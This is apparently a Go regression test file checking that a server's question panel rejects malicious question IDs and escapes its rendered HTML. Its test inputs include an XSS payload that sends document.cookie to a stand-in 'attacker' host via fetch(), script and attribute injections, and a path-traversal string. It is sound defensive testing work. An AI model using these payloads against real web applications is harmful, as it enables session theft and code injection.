package server

import (
	"fmt"
	"strings"
	"testing"

	"github.com/sklarsa/kanedias/internal/manager"
	"github.com/sklarsa/kanedias/internal/supervisor"
)

// questionPanelFor builds a questionPanelView from a single raw supervisor
// question, exercising the same projection boundary the live streams use.
func questionPanelFor(q supervisor.QuestionSummary) questionPanelView {
	return newQuestionPanelView(manager.SessionState{
		Node: supervisor.NodeSnapshot{
			SessionID: "session-under-test",
			Lifecycle: "question",
			Questions: []supervisor.QuestionSummary{q},
		},
	})
}

// TestQuestionsRejectsMaliciousQuestionID is the load-bearing XSS regression
// (defect UI-C1). A hostile/compromised root supervisor supplies a question ID
// crafted to break out of a JS string literal inside a Datastar new Function()
// body. The projection boundary must neuter the ID: mark the question
// non-answerable and drop the ID so it never reaches a browser JS/URL/attribute
// context, and the rendered fragment must contain no action wiring or raw
// injected payload.
func TestQuestionsRejectsMaliciousQuestionID(t *testing.T) {
	templates, err := parseTemplates(webFiles)
	if err != nil {
		t.Fatalf("parseTemplates: %v", err)
	}

	malicious := []string{
		`'); fetch('https://attacker/?c='+document.cookie);//`,
		`q1'+document.cookie+'`,
		`<script>alert(1)</script>`,
		`x" onload="alert(1)`,
		`../../etc/passwd`,
		strings.Repeat("a", 129), // over the 128-char cap
	}

	for i, id := range malicious {
		id := id
		t.Run(fmt.Sprintf("case-%d", i), func(t *testing.T) {
			// The manager-level validator must reject the ID outright.
			if manager.ValidQuestionID(id) {
				t.Fatalf("ValidQuestionID(%q) = true, want false", id)
			}

			view := questionPanelFor(supervisor.QuestionSummary{
				ID:      id,
				Method:  "select",
				Title:   "Choose",
				Options: []string{"yes", "no"},
			})

			// Boundary neuters the question: non-answerable, empty ID.
			if len(view.Questions) != 1 {
				t.Fatalf("expected 1 projected question, got %d", len(view.Questions))
			}
			q := view.Questions[0]
			if q.Answerable {
				t.Errorf("malicious question marked answerable; want non-answerable")
			}
			if q.ID != "" {
				t.Errorf("malicious question ID not dropped: %q", q.ID)
			}

			rendered, err := renderTemplate(templates, templateQuestions, view)
			if err != nil {
				t.Fatalf("render questions.html: %v", err)
			}

			// The dangerous substrings must never appear un-neutralised. In
			// particular a raw single quote from the ID must not survive into
			// the output where the browser could re-decode it inside a
			// new Function() body.
			if strings.Contains(rendered, "document.cookie") {
				t.Errorf("rendered fragment leaks injected JS (document.cookie):\n%s", rendered)
			}
			if strings.Contains(rendered, "<script>") {
				t.Errorf("rendered fragment contains an un-escaped <script> tag:\n%s", rendered)
			}
			// No action controls should render for a non-answerable question,
			// so there must be no POST wiring targeting a question route.
			if strings.Contains(rendered, "/questions/") {
				t.Errorf("rendered fragment wires an action for a non-answerable question:\n%s", rendered)
			}
			if strings.Contains(rendered, "data-on:click") {
				t.Errorf("rendered fragment carries a click action for a non-answerable question:\n%s", rendered)
			}
		})
	}
}

// TestQuestionsRenderSelectOptions is the UI-F1 regression. A select-method
// question WITH options must render one button per option, each carrying the
// correct (safe) question ID and wired to the question answer route. Before the
// fix this panicked/errored because the template referenced $.ID (the panel
// view, which has no ID) inside {{range .Options}}, dropping the whole patch.
func TestQuestionsRenderSelectOptions(t *testing.T) {
	templates, err := parseTemplates(webFiles)
	if err != nil {
		t.Fatalf("parseTemplates: %v", err)
	}

	view := questionPanelFor(supervisor.QuestionSummary{
		ID:      "select-q.1",
		Method:  "select",
		Title:   "Pick a contract",
		Options: []string{"alpha", "beta"},
	})

	if !view.Questions[0].Answerable {
		t.Fatalf("safe question ID was rejected by the boundary")
	}

	rendered, err := renderTemplate(templates, templateQuestions, view)
	if err != nil {
		t.Fatalf("render questions.html (select): %v", err)
	}

	// One button per option, each labelled with the option text.
	if got := strings.Count(rendered, `class="qopt"`); got != 2 {
		t.Errorf("expected 2 option buttons, got %d:\n%s", got, rendered)
	}
	for _, opt := range []string{"alpha", "beta"} {
		if !strings.Contains(rendered, opt) {
			t.Errorf("select option %q not rendered:\n%s", opt, rendered)
		}
	}
	// Option buttons must carry the question ID as data (attribute), and the
	// action must build the route from el.dataset — not by interpolating the ID
	// into the JS expression.
	if !strings.Contains(rendered, `data-question-id="select-q.1"`) {
		t.Errorf("option button missing data-question-id:\n%s", rendered)
	}
	if !strings.Contains(rendered, `data-option-value="alpha"`) {
		t.Errorf("option button missing data-option-value:\n%s", rendered)
	}
	if !strings.Contains(rendered, "el.dataset.questionId") {
		t.Errorf("action does not read the question ID from the dataset:\n%s", rendered)
	}
	if !strings.Contains(rendered, "el.dataset.optionValue") {
		t.Errorf("action does not read the option value from the dataset:\n%s", rendered)
	}
	// The ID must NOT be concatenated into the action expression as a literal.
	if strings.Contains(rendered, "/questions/select-q.1") {
		t.Errorf("question ID was interpolated into the action URL instead of carried as data:\n%s", rendered)
	}
}
